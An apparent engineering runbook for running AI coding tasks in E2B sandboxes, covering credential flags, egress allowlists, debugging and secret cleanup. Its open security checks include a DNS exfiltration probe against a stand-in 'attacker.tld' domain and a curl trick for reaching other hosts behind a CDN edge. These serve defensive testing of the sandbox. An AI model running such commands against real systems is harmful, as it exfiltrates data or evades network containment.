# E2B Runs / RUNBOOK

## Before editing

```bash
ravi specs get sandbox/e2b-runs --mode full --json
```

Read `src/sandbox/e2b.ts` top to bottom once: the run is one long function
with the network, credential and signal handling interleaved on purpose, so a
change in one place usually needs a test in `src/sandbox/e2b.test.ts` that
drives the fake sandbox end to end.

## Running a task

```bash
export E2B_API_KEY=…  ANTHROPIC_API_KEY=sk-ant-api03-…   # never an OAuth token
ravi sandbox run --repo https://github.com/owner/repo.git --task "…" --follow
```

- Private GitHub repo: also export `GITHUB_TOKEN`. It is used during the clone
  only.
- The worker needs a host that is not a package registry:
  `--allow-host internal.example.com --allow-host '*.corp.example'`.
- No registries at all: `--egress strict`.
- A broker in front of Anthropic: `RAVI_SANDBOX_ANTHROPIC_BASE_URL=https://…`
  (model auth becomes `broker`).
- Private repo on a host where the GitHub transform rule is not honoured:
  `--github-auth file` (the token goes through git's credential file inside the
  sandbox, removed after the clone; the model key still travels by header).
- A host where header injection cannot work for the model either:
  `--model-auth env --allow-key-in-env` (the key is then visible to E2B;
  `--keep` is refused).
- Go repositories: the preset has no GOPROXY (it relays to arbitrary origins);
  add `--allow-host proxy.golang.org --allow-host sum.golang.org` knowingly.
- Title plus instructions are capped at 100 KiB; put longer material in the
  repository and refer to it.

## Debugging a failed run

`~/.ravi/sandbox-runs/<sandbox-id>/run.log` has the step timeline, including
the line `Egress: deny-all except …` that lists the run-phase allowlist.
`daemon.log`, `sessions/*.trace.txt` and `transcripts/` show what the worker
did. `e2b/processes.txt` lists every command E2B ran; the task text must not
appear in it (only `$(cat /home/user/.ravi-task/…)`).

- `git clone` fails with a TLS or 403 error on a private repo: the GitHub
  transform rule is not being honoured (CA trust, see the open checks below) or
  the token is wrong. The runner falls back to git's credential file on its own
  only when the secret store refuses the rule, not when the proxy does not
  inject. To force the file path while the proxy problem is investigated, run
  with `--github-auth file`; the model key keeps going through the header.
- A second Ctrl-C during the kill is ignored on purpose (`cleanup in progress`
  in run.log); the process exits once the kill and the secret removal settle,
  or after 15 s at most.
- `e2b/processes.txt` shows `ANTHROPIC_API_KEY=sk-ant-api03-ravi-sandbox-placeholder`
  in clear: that is the placeholder, not a key, and the redaction leaves it so.
- Claude Code reports 401 from the model: in `header` mode the `x-api-key`
  rule did not fire. Check the sandbox's network config in the E2B dashboard:
  the rule for `api.anthropic.com` must show the `${e2b.secrets.…}`
  placeholder, never a literal key.
- `bun install` or tests fail with network errors: the host is not in the
  allowlist. Add it with `--allow-host`; do not switch off `denyOut`.
- A paused (`--keep`) sandbox cannot be used for anything that needs the
  network; that is by design. Resume it in the E2B dashboard and inspect the
  filesystem only.

## Leaked secret

If an E2B secret named `ravi-sbx-<runId>-…` survives a crashed run, remove it:

```bash
# in a bun REPL with the e2b package
await Secret.destroy("ravi-sbx-<runId>-anthropic", { apiKey: process.env.E2B_API_KEY })
```

Then rotate the Anthropic key or GitHub token it held.

## Open live checks (need the E2B test key; none can run from the fake)

Each is a security question the fake cannot answer. Record the result here with
its date when it has run; until then treat the answer as unknown, not as safe.

1. DNS exfiltration under deny-all. Inside a sandbox created with
   `denyOut: ["0.0.0.0/0"]` and the clone-phase `allowOut`, does
   `dig <payload>.attacker.tld @8.8.8.8` (UDP/53 to an external resolver) fail,
   and does DNS-over-HTTPS to a resolver that is not in `allowOut` fail? If
   either succeeds, the policy leaks data through names and the preset is not
   the bound it claims to be. Also note whether ordinary resolution of
   allowlisted hosts still works (it has to, or nothing does).
   Result: not yet run.
2. SNI versus resolved IP. Does `allowOut: ["registry.npmjs.org"]` match on the
   TLS SNI / HTTP host, or on the address the name resolved to? If on the
   address, every other service behind the same CDN edge is reachable too
   (`curl --resolve other.cdn.host:443:<ip> https://other.cdn.host/` from the
   sandbox tells). Result: not yet run.
3. Does E2B log `files.write` content? Write a marker string with
   `sandbox.files.write` and look for it in `ravi sandbox logs <id>`
   (`e2b/processes.txt`, `e2b/logs.txt`). The credential-file clone path
   (`--github-auth file`) and the task-text files rely on the answer being no.
   Result: not yet run.
4. CA trust under transform rules. Do `git clone` and Claude Code (Node) accept
   E2B's egress-proxy certificate when a rule rewrites headers on
   `github.com` and `api.anthropic.com`? If not, set `NODE_EXTRA_CA_CERTS`
   (and git's `http.sslCAInfo`) to E2B's CA path in the sandbox env, or the
   header modes cannot work. Result: not yet run.
5. Also confirm that `Sandbox.list({ query: { metadata } })` filters on
   `ravi_run`/`ravi_host`, and that `updateNetwork` preserves
   `allowPublicTraffic: false`. Result: not yet run.

`header` model auth is the default, but it is not trusted until check 4 is
recorded here with its date: so far it has only been exercised against the
fake. The known-good path for a real run today is `--model-auth env
--allow-key-in-env` for the model and `--github-auth file` for a private clone,
both with the costs stated above.
